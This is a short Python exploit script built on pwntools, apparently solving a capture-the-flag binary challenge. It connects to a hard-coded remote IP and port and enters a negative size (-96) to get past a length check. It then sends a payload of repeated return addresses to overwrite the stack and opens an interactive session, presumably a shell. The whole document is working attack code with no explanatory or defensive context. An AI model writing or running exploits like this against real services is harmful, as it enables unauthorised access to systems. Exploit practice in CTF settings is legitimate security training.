from pwn import *

context.arch = 'amd64'
con = remote('133.242.68.223', 35285)

con.recvregex('Input size :')
con.sendline('-96')
con.recvregex('Input Content :')

payload = pack(0x4007c1) * 4
con.sendline(payload)
con.recvline()

con.interactive()
